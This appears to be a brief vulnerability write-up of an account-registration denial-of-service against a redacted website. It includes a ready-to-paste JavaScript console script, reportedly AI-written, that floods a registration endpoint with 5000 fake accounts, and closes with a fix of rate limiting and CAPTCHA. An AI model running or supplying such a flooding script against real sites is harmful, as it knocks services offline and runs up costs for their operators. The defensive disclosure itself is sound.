# Account Registration DoS

## Exploitation

Registering into the website did not require an email, it just required a username and a password.

I decided to flood the database with thousands of accounts through a JavaScript script made by AI to be pasted into the console.

Code provided below.

```javascript
(async function registerArmy(y) {
    const url = "https://[REDACTED].com/auth/register";
    console.log(`Deploying ${y} clones...`);

    for (let i = 1; i <= y; i++) {
        const randomSuffix = Math.random().toString(36).substring(7);
        const username = `person_is_noob_${i}_${randomSuffix}`;
        const display_name = `person ${randomSuffix}`;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            },
            body: JSON.stringify({
                username: username,
                password: "person",
                display_name: display_name
            })
        })
        .then(res => {
            if (res.status === 201 || res.status === 200) {
                console.log(`[+] Created: ${username}`);
            } else {
                console.log(`[-] Failed ${username}: ${res.status}`);
            }
        })
        .catch(() => {});

        if (i % 25 === 0) {
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    }
    console.log("User Army deployment finished.");
})(5000); 
```

## Why this can be very bad

Not only does this attack cause your server to be unresponsive via a DoS, it also registers many accounts to your database. If you are on a free tier, such an attack can cause your free tier to expire and require you to pay just to accomodate more users.

## The Fix

Implement rate-limiting via IP address (e.g. 3 registrations a minute every IP), and add a CAPTCHA (cryptographic challenge) for each registration.
